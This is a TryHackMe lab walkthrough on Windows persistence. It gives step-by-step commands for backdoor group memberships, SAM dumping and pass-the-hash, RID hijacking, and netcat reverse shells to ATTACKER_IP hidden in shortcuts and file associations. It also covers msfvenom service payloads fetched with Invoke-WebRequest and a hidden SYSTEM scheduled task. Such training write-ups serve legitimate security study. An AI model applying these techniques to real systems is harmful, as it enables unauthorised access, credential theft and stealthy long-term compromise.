# Windows Local Persistence — TryHackMe Walkthrough Task 1 to 5
**Difficulty:** Medium  
**Author:** Meng Hor 

--- 

After gaining initial foothold into a machine, we need to find a way to regain the access and sometimes doing the same thing will not work. This room offers multiple ways we can do to REGAIN the access to the machine.

--- 

## Task 2: Tampering With Unprivileged Accounts


### Assign Group Memberships
Add the unprivileged account to the Backup Operators group to avoid suspicion 
```bash
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use WinRM for this task:
```bash
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

Disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```bash
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Using this creditial 

<img width="497" height="213" alt="Screenshot 2025-10-21 at 9 56 30 in the morning" src="https://github.com/user-attachments/assets/dad79ce5-2f88-49b0-a232-21a4fe2a9d4c" />

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user: (On Attacker's Machine)
```bash
root@ip-10-201-4-134:~# evil-winrm -i 10.201.49.91 -u thmuser1 -p Password321
```

After this we should be in!!!
We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```bash
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

After downloading them we can use ```secretsdump.py``` from this github https://github.com/fortra/impacket/tree/master/impacket/examples

```bash
root@ip-10-201-63-127:~# python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
[*] Cleaning up... 
```

Finally perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```bash
root@ip-10-201-4-134:~# evil-winrm -i 10.201.49.91 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

**NOTE THE HASH WILL BE DIFFERENT** 
You should be now in the administrator account

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
THM{REDACTED!!!}
```


Q1. <img width="1397" height="114" alt="Screenshot 2025-10-21 at 10 39 54 in the morning" src="https://github.com/user-attachments/assets/2a6ed355-cd32-44ab-95a0-cae62b572c11" />

### Special Privileges and Security Descriptors

In the case of the Backup Operators group, it has the following two privileges assigned by default:

- SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
- SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the secedit command. First, we will export the current configuration to a temporary file in the command prompt:
```bash
secedit /export /cfg config.inf
```

Open the config.inf file by ```config.inf``` in the cmd and add thmuser2 to ```SeBackupPrivilege``` and ```SeRestorePrivilege```
<img width="752" height="516" alt="image" src="https://github.com/user-attachments/assets/63b2de1f-56f1-4c19-9a2a-14bda82ff8d7" />

convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```bash
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

In Powershell:
```bash
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Now we can add thmuser2 to the WinRM's security descriptor:

<img width="357" height="444" alt="image" src="https://github.com/user-attachments/assets/15ed2e52-360f-4c73-b155-5dc047bdcbd9" />

We now can winRM with our machine:
```bash
root@ip-10-201-63-127:~# evil-winrm -i 10.201.39.145 -u thmuser2 -p Password321
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\thmuser2\Documents> C:\flags\flag2.exe
THM{REDACTED!!!}
```
Q2. 
<img width="1395" height="123" alt="Screenshot 2025-10-21 at 11 21 23 in the morning" src="https://github.com/user-attachments/assets/001de42c-75a7-49ae-b9c4-c4578e9dbcd0" />

### RID Hijacking

We can change registry values to make the operating system think you are an administrator.
In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.

Assign RID 500 to thmuser3.
Run Regedit as SYSTEM, we will use psexec, available in C:\tools\pstools in your machine:
```bash
C:\tools\pstools> PsExec64.exe -i -s regedit
```
This will open a registry editor and go to ```HKLM\SAM\SAM\Domains\Account\Users\``` 

Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). 

* TO GET RID ``` wmic useraccount get name,sid ```

<img width="840" height="526" alt="image" src="https://github.com/user-attachments/assets/76a1a302-e2da-4e4a-948a-8647b342968d" />

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
<img width="597" height="317" alt="image" src="https://github.com/user-attachments/assets/346fbc1b-49c4-423c-a58b-544a72aec3cb" />

Now we connect via RDP (Remmina or any other RDP of your choice)

```bash
c:\tools\pstools>C:\flags\flag3.exe
THM{REDACTED!!!}
```

Q3. <img width="1383" height="108" alt="Screenshot 2025-10-21 at 2 46 29 in the afternoon" src="https://github.com/user-attachments/assets/7004d5e7-f003-4196-8811-e7d95aa049c0" />

--- 

## Task 3: Backdooring Files

Another common method to gain access is through tampering with commonly used files

### Shortcut Files

Let's create a simple Powershell script in C:\Windows\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties, and save it to ```backdoor.ps1``` file:

```bash
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
```

Go to properties of calc on the Desktop
Change target to ```powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1```

Start nc listener on attacker's machine by ```nc -lvp 4445```
We should get the flag
```bash
C:\Users\Administrator>C:\flags\flag5.exe
C:\flags\flag5.exe
THM{REDACTED!!!}
```
Q1. 

<img width="627" height="99" alt="Screenshot 2025-10-21 at 3 28 53 in the afternoon" src="https://github.com/user-attachments/assets/6d3f4708-c73b-45ca-bd08-d013ab5c07e3" />

### Hijacking File Associations

Create a powershell file called backdoor2.ps1:
```bash
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Go to Registry Editor and search for ```HKLM\Software\Classes\shell\open\command```
<img width="754" height="271" alt="image" src="https://github.com/user-attachments/assets/c6b0fa0f-c995-41ba-91a2-330321090790" />

Change the value of the data to 
```bash
powershell -windowstyle hidden C:\windows\backdoor2.ps1
```
Start nc listener on attacker's machine by ```nc -lvp 4448```
We should get the flag
```bash
C:\Windows\system32>C:\flags\flag6.exe
C:\flags\flag6.exe
THM{REDACTED!!!}
```
Q2. 

<img width="637" height="104" alt="Screenshot 2025-10-21 at 4 24 54 in the afternoon" src="https://github.com/user-attachments/assets/e90587e8-b34e-4cb7-831d-6ae348a0f0b0" />

---

## Abusing Services

Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started.

### Creating backdoor services

On your attacker's machine, generate backdoor payload:
```bash
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```
As well as starting a netcat listener on port ```4448```

Transfer the ```rev-svc.exe``` to the victim's machine, I did this by serving up a simple HTTP server
```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

On Windows Powershell run the following command, this should get the ```rev-svc.exe``` file:
```bash
Invoke-WebRequest -Uri "http://10.201.84.210:8000/rev-svc.exe" -OutFile "C:\Windows\rev-svc.exe"
```
Continuing on Windows Powershell:
```bash
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

Doing this should get you a connection on the attacker's machine.
```bash
C:\Windows\system32>C:\flags\flag7.exe
C:\flags\flag7.exe
THM{REDACTED!!!}
```
Q1. 

<img width="637" height="104" alt="Screenshot 2025-10-21 at 4 24 54 in the afternoon" src="https://github.com/user-attachments/assets/2b416a98-9d49-4d54-98fd-06ec34e5af2b" />

### Modifying existing services

For this task we also want to create a reverse shell script via msfvenom:
```bash
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```
Once again, we would also want to start a nc listener on port ```5558```

Copy the rev-svc2.exe to our victim's machine just like before:
```bash
Invoke-WebRequest -Uri "http://10.201.84.210:8000/rev-svc2.exe" -OutFile "C:\Windows\rev-svc2.exe"
```
To reconfigure "THMservice3" parameters, we can use the following command:
```bash
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

This should gets us in.
```bash
C:\Windows\system32>C:\flags\flag8.exe
C:\flags\flag8.exe
THM{REDACTED!!!}
```
Q2. 

<img width="621" height="105" alt="flag8" src="https://github.com/user-attachments/assets/a4b1bbe2-e1c3-46f8-a55b-4ab22d9fff96" />

## Abusing Scheduled Tasks

## Task Scheduler 

In the Victim's machine create a task schedule that runs every 1 minute:
```bash
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```
Open the registry editor by:
```bash
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```
And go to ```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\```
We will want to delete its security descriptor.

Going to our attacker's machine and start up a netcat listener on port ```4449```

We should get our flag.
```bash
C:\Windows\system32>C:\flags\flag9.exe
C:\flags\flag9.exe
THM{REDACTED!!!}
```

Q1. 
<img width="621" height="105" alt="flag9" src="https://github.com/user-attachments/assets/6b65d0ce-034d-4d1c-acbd-5ca49216458e" />

---

Thank you for taking the time to read through my walkthrough.


















